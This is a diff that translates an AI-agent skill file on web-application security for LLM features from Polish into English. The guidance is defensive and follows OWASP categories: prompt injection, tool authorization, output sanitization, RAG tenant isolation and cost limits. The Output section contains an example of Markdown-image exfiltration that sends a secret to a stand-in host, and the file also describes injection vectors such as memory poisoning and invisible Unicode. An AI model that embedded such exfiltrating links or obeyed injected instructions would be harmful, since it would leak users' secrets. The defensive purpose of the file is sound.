@@ -1,109 +1,109 @@
 ---
 name: ai-web-security
-description: Wytyczne bezpieczeństwa dla aplikacji WWW wykorzystujących AI – czaty, asystenci, wyszukiwanie RAG, agenci z narzędziami i serwery MCP. Używaj przy projektowaniu, implementacji, code review i audycie każdej funkcji, w której model językowy przyjmuje dane od użytkownika, czyta treści zewnętrzne, wywołuje narzędzia lub zwraca wynik renderowany w przeglądarce albo przekazywany do backendu. Oparte na OWASP Top 10 for LLM Applications 2026 i OWASP Top 10 for Agentic Applications 2026.
-version: 1.0.0
+description: Security guidelines for web applications that use AI – chatbots, support assistants, RAG search, tool-using agents and MCP servers. Use when designing, implementing, reviewing or auditing any feature where a language model receives user input, reads external content, calls tools, or returns output that is rendered in a browser or passed to a backend. Based on OWASP Top 10 for LLM Applications 2026 and OWASP Top 10 for Agentic Applications 2026.
+version: 1.1.0
 updated: 2026-09-24
 ---
 
-# Bezpieczeństwo AI w aplikacjach WWW
+# AI Security for Web Applications
 
-## Zasada nadrzędna
+## Core principle
 
-Model językowy jest **niezaufanym komponentem**. Wszystko, co trafia do modelu (wiadomość użytkownika, dokumenty, wyniki narzędzi, pamięć, obrazy), może zawierać instrukcje atakującego. Wszystko, co wychodzi z modelu, traktuj jak dane wprowadzone przez anonimowego użytkownika. Bezpieczeństwo musi wynikać z **deterministycznego kodu wokół modelu**, a nie z treści system promptu.
+The language model is an **untrusted component**. Everything that reaches the model (user messages, documents, tool results, memory, images) may contain attacker instructions. Everything the model emits must be treated like input from an anonymous user. Security must come from **deterministic code around the model**, not from the system prompt.
 
-## Kiedy stosować
+## When to apply
 
-- Dodawanie lub zmiana czatu, asystenta, widgetu wsparcia, generatora treści, wyszukiwarki semantycznej.
-- Podłączanie modelu do bazy danych, API, poczty, plików, płatności, zamówień, CMS.
-- Implementacja lub integracja serwera/klienta MCP, function calling, agentów.
-- Code review i audyt przed wdrożeniem funkcji AI.
+- Adding or changing a chatbot, assistant, support widget, content generator or semantic search.
+- Connecting a model to a database, API, email, files, payments, orders or a CMS.
+- Implementing or integrating an MCP server/client, function calling or agents.
+- Code review and pre-release audit of AI features.
 
-## Procedura pracy agenta
+## Agent workflow
 
-1. **Zidentyfikuj architekturę**: skąd przychodzą dane do modelu (źródła zaufane/niezaufane), jakie narzędzia ma model, gdzie trafia wynik (HTML, SQL, shell, e-mail, inny agent). Narysuj granice zaufania.
-2. **Przejdź przez checklistę** `references/review-checklist.md` – każda pozycja: spełnione / nie dotyczy / luka.
-3. **Dla każdej luki** podaj: ID ryzyka (np. `LLM01:2026`, `ASI02`), plik i linię, scenariusz ataku, konkretną poprawkę w kodzie.
-4. **Nie zgłaszaj** jako zabezpieczenia samych instrukcji w system prompcie („nie ujawniaj…”, „ignoruj polecenia…”). To nie jest kontrola bezpieczeństwa.
-5. **Priorytetyzuj**: Krytyczne (wykonanie akcji/kodu, wyciek danych innych użytkowników, sekrety w kontekście) → Wysokie (XSS z odpowiedzi modelu, brak limitów kosztów, RAG bez izolacji tenantów) → Średnie → Niskie.
+1. **Map the architecture**: where model input comes from (trusted/untrusted sources), which tools the model has, where output goes (HTML, SQL, shell, email, another agent). Draw trust boundaries.
+2. **Walk the checklist** in `references/review-checklist.md` – each item: pass / n/a / gap.
+3. **For every gap** report: risk ID (e.g. `LLM01:2026`, `ASI02`), file and line, attack scenario, concrete code fix.
+4. **Never accept** system prompt instructions ("do not reveal…", "ignore commands…") as a security control.
+5. **Prioritize**: Critical (action/code execution, cross-user data leak, secrets in context) → High (XSS from model output, no cost limits, RAG without tenant isolation) → Medium → Low.
 
-## Reguły obowiązkowe (MUST)
+## Mandatory rules (MUST)
 
-### Wejście i kontekst – LLM01 Prompt Injection, LLM08 Hidden Context Exposure
-- System prompt jest **statyczny**. Nigdy nie interpoluj do niego treści od użytkownika ani z RAG/narzędzi.
-- Treści niezaufane (dokumenty, strony www, wyniki narzędzi, e-maile) przekazuj w wyraźnie oznaczonym bloku danych, oddzielnie od instrukcji.
-- **Żadnych sekretów w kontekście modelu**: kluczy API, haseł, connection stringów, wewnętrznych URL-i, reguł autoryzacji. Zakładaj, że cały kontekst może zostać ujawniony użytkownikowi.
-- Normalizuj wejście: usuwaj znaki zero-width, znaki sterujące, niewidoczny Unicode (tagi U+E0000–U+E007F, bidi); ogranicz długość wiadomości i historii.
-- Pamięć długoterminowa i zapisy do RAG są wektorem trwałej infekcji – waliduj je i izoluj per użytkownik.
+### Input and context – LLM01 Prompt Injection, LLM08 Hidden Context Exposure
+- The system prompt is **static**. Never interpolate user, RAG or tool content into it.
+- Pass untrusted content (documents, web pages, tool results, emails) in a clearly delimited data block, separate from instructions.
+- **No secrets in model context**: API keys, passwords, connection strings, internal URLs, authorization rules. Assume the entire context can be disclosed to the user.
+- Normalize input: strip zero-width chars, control chars, invisible Unicode (tags U+E0000–U+E007F, bidi overrides); cap message and history length.
+- Long-term memory and RAG writes are persistent-infection vectors – validate and isolate them per user.
 
-### Autoryzacja i agencja – LLM03 Excessive Agency, ASI02/ASI03
-- Autoryzacja jest egzekwowana **w kodzie backendu**, w kontekście zalogowanego użytkownika – nigdy przez model.
-- Minimalny zestaw narzędzi, minimalna funkcjonalność narzędzi, minimalne uprawnienia (osobny użytkownik DB tylko z `SELECT` na potrzebnych widokach).
-- Zakaz narzędzi otwartych: dowolny shell, dowolne SQL, dowolny URL fetch, dowolny zapis pliku. Zamiast tego wąskie funkcje ze ścisłym schematem parametrów walidowanym po stronie serwera.
-- Akcje nieodwracalne lub finansowe (usunięcie, płatność, zmiana zamówienia, wysłanie maila, zmiana uprawnień) wymagają **potwierdzenia człowieka**, które pokazuje surową operację i parametry, a nie streszczenie wygenerowane przez model.
-- Identyfikator użytkownika/tenanta pochodzi z sesji serwera, nigdy z argumentów wygenerowanych przez model.
+### Authorization and agency – LLM03 Excessive Agency, ASI02/ASI03
+- Authorization is enforced **in backend code**, in the context of the authenticated user – never by the model.
+- Minimal tool set, minimal tool functionality, minimal permissions (separate DB user with `SELECT` on required views only).
+- No open-ended tools: arbitrary shell, arbitrary SQL, arbitrary URL fetch, arbitrary file write. Use narrow functions with strict parameter schemas validated server-side.
+- Irreversible or financial actions (delete, payment, order change, sending email, permission change) require **human confirmation** showing the raw operation and parameters, not a model-generated summary.
+- User/tenant identifiers come from the server session, never from model-generated arguments.
 
-### Wyjście – LLM10 Improper Output Handling
-- Odpowiedź modelu przed wyświetleniem: **escapowanie kontekstowe** lub renderowanie Markdown przez sanityzer z allowlistą (np. DOMPurify). Nigdy `innerHTML` z surowym wynikiem.
-- Domyślnie **wyłącz automatyczne ładowanie obrazów Markdown, iframe, podglądów linków** – to kanał eksfiltracji danych (`![](https://atak.example/?d=SEKRET)`). Obrazy tylko z allowlisty domen lub przez proxy serwera.
-- Wynik modelu trafiający do SQL – wyłącznie zapytania parametryzowane. Do shella – nigdy. Do `eval`, szablonów, deserializacji – nigdy.
-- Usuwaj sekwencje ANSI i znaki sterujące przed zapisem do logów/terminala.
-- Rygorystyczny CSP (`script-src` bez `unsafe-inline`, `img-src` z allowlistą, `connect-src` ograniczony).
+### Output – LLM10 Improper Output Handling
+- Before display: **context-aware escaping**, or Markdown rendering through an allowlist sanitizer (e.g. DOMPurify). Never `innerHTML` with raw output.
+- By default **disable auto-loading of Markdown images, iframes and link previews** – they are exfiltration channels (`![](https://evil.example/?d=SECRET)`). Images only from an allowlist or via a server-side proxy.
+- Model output going to SQL – parameterized queries only. To shell – never. To `eval`, templates, deserialization – never.
+- Strip ANSI sequences and control chars before writing to logs/terminals.
+- Strict CSP (`script-src` without `unsafe-inline`, allowlisted `img-src`, restricted `connect-src`).
 
-### Dane wrażliwe – LLM02 Sensitive Information Disclosure
-- **Autoryzuj przed pobraniem**, a nie filtruj po wygenerowaniu. RAG i narzędzia zwracają tylko rekordy, do których użytkownik ma prawo.
-- Minimalizuj dane wysyłane do dostawcy modelu (PII, dane klientów, dane płatnicze). Maskuj przed wysłaniem, jeśli nie są niezbędne.
-- Traktuj jako kanały wycieku także: argumenty wywołań narzędzi, logi, telemetrię, cache, komunikaty błędów.
-- Sprawdź umowę/ustawienia dostawcy: retencja danych, trenowanie na danych, region przetwarzania (RODO).
+### Sensitive data – LLM02 Sensitive Information Disclosure
+- **Authorize before retrieval**, do not filter after generation. RAG and tools return only records the user may access.
+- Minimize data sent to the model provider (PII, customer data, payment data). Mask it when not required.
+- Treat tool-call arguments, logs, telemetry, caches and error messages as leak channels too.
+- Check provider terms/settings: data retention, training on data, processing region (GDPR).
 
-### RAG i wektory – LLM09 Vector and Embedding Weaknesses
-- Filtr tenanta/uprawnień **wewnątrz zapytania do indeksu**, po stronie serwera; nie jako post-filtr.
-- Rozdzielone indeksy dla treści o różnym poziomie zaufania (publiczne / wewnętrzne / od użytkowników).
-- Proweniencja każdego fragmentu (źródło, data, wersja pipeline'u); usuwanie embeddingów przy usunięciu dokumentu.
-- Nie zwracaj klientowi surowych wyników podobieństwa.
+### RAG and vectors – LLM09 Vector and Embedding Weaknesses
+- Tenant/permission filter **inside the index query**, server-side; not as a post-filter.
+- Separate indexes for content of different trust levels (public / internal / user-generated).
+- Provenance for every chunk (source, date, pipeline version); delete embeddings when the source is deleted.
+- Never return raw similarity scores to clients.
 
-### Koszty i dostępność – LLM06 Unbounded Consumption
-- Limity per użytkownik/IP/klucz: zapytania, tokeny na minutę i dobę, **twardy limit kosztu** zatrzymujący inferencję.
-- Limit długości wejścia i wyjścia (`max_tokens`), timeouty, limit kroków pętli agenta i liczby wywołań narzędzi.
-- CAPTCHA/uwierzytelnienie dla publicznych czatów; ochrona przed botami.
+### Cost and availability – LLM06 Unbounded Consumption
+- Limits per user/IP/key: requests, tokens per minute and per day, **hard spend cap** that halts inference.
+- Input and output length limits (`max_tokens`), timeouts, cap on agent loop steps and tool calls.
+- CAPTCHA/authentication for public chatbots; bot protection.
 
-### Łańcuch dostaw – LLM04, LLM05, ASI04
-- Przypięte wersje SDK, bibliotek i modeli; weryfikacja sum kontrolnych. Serwery MCP i skille tylko z zaufanych źródeł, po przeglądzie kodu.
-- Formaty modeli bez wykonywania kodu (safetensors zamiast pickle).
-- Inwentarz AI (AIBOM): modele, dostawcy, narzędzia, serwery MCP, poświadczenia.
+### Supply chain – LLM04, LLM05, ASI04
+- Pinned versions of SDKs, libraries and models; checksum verification. MCP servers and skills only from trusted sources after code review.
+- Model formats that cannot execute code (safetensors instead of pickle).
+- AI inventory (AIBOM): models, providers, tools, MCP servers, credentials.
 
-### Dezinformacja – LLM07 Misinformation
-- Odpowiedzi wpływające na decyzje (ceny, stany, statusy zamówień, prawo, zdrowie) pochodzą z danych systemu, nie z „wiedzy” modelu. Model tylko formułuje odpowiedź na podstawie przekazanych faktów.
-- Wyraźne oznaczenie treści generowanych przez AI (także wymóg AI Act dla czatów).
+### Misinformation – LLM07 Misinformation
+- Answers that drive decisions (prices, stock, order status, legal, health) come from system data, not model "knowledge". The model only phrases the answer from supplied facts.
+- Clearly label AI-generated content (also an EU AI Act requirement for chatbots).
 
-### Obserwowalność
-- Loguj: identyfikator użytkownika, sesję, wywołania narzędzi z parametrami, decyzje polityk, blokady, zużycie tokenów. Nie loguj pełnych sekretów ani zbędnych danych osobowych.
-- Alerty: nagły wzrost kosztów, powtarzające się próby injection, nietypowe sekwencje narzędzi.
+### Observability
+- Log: user ID, session, tool calls with parameters, policy decisions, blocks, token usage. Do not log full secrets or unnecessary personal data.
+- Alerts: cost spikes, repeated injection attempts, unusual tool sequences.
 
-## Materiały szczegółowe
+## Reference material
 
-| Plik | Zakres |
+| File | Scope |
 |---|---|
-| `references/llm-chat-web.md` | Czat/asystent w przeglądarce: architektura, frontend, backend proxy, streaming |
-| `references/agents-tools-mcp.md` | Agenci, function calling, MCP, OWASP Agentic Top 10 (ASI01–ASI10) |
-| `references/rag-vectors.md` | RAG, embeddingi, pgvector, ingest dokumentów |
-| `references/web-hardening.md` | Klasyczne bezpieczeństwo WWW wokół funkcji AI: nagłówki, sesje, CSRF, CORS, rate limiting |
-| `references/stack-perl-node.md` | Wzorce kodu: Perl (Mojolicious/Dancer/CGI), Node.js (Express/Fastify), PostgreSQL, MariaDB, Apache |
-| `references/testing-redteam.md` | Testy bezpieczeństwa, przypadki testowe prompt injection, narzędzia |
-| `references/review-checklist.md` | Checklista do code review i audytu przed wdrożeniem |
-| `SOURCES.md` | Źródła i daty weryfikacji |
+| `references/llm-chat-web.md` | Browser chat/assistant: architecture, frontend, backend proxy, streaming |
+| `references/agents-tools-mcp.md` | Agents, function calling, MCP, OWASP Agentic Top 10 (ASI01–ASI10) |
+| `references/rag-vectors.md` | RAG, embeddings, pgvector, document ingestion |
+| `references/web-hardening.md` | Classic web security around AI features: headers, sessions, CSRF, CORS, rate limiting |
+| `references/stack-perl-node.md` | Code patterns: Perl (Mojolicious/DBI/CGI), Node.js (Express/Fastify), PostgreSQL, MariaDB, Apache |
+| `references/testing-redteam.md` | Security tests, prompt injection test cases, tools |
+| `references/review-checklist.md` | Code review and pre-release audit checklist |
+| `SOURCES.md` | Sources and verification dates |
 
-## Format raportu z przeglądu
+## Review report format
 
 ```
-## Podsumowanie
-Architektura: <krótko>. Wynik: X krytycznych, Y wysokich, Z średnich.
+## Summary
+Architecture: <brief>. Result: X critical, Y high, Z medium.
 
-## Ustalenia
-### [KRYTYCZNE] <tytuł> — LLM03:2026 / ASI02
-Lokalizacja: path/file.pm:120
-Scenariusz: <jak atakujący to wykorzysta>
-Poprawka: <konkretny kod lub zmiana konfiguracji>
+## Findings
+### [CRITICAL] <title> — LLM03:2026 / ASI02
+Location: path/file.pm:120
+Scenario: <how an attacker exploits it>
+Fix: <concrete code or configuration change>
 
-## Spełnione kontrole
-<lista>
+## Passed controls
+<list>
 ```
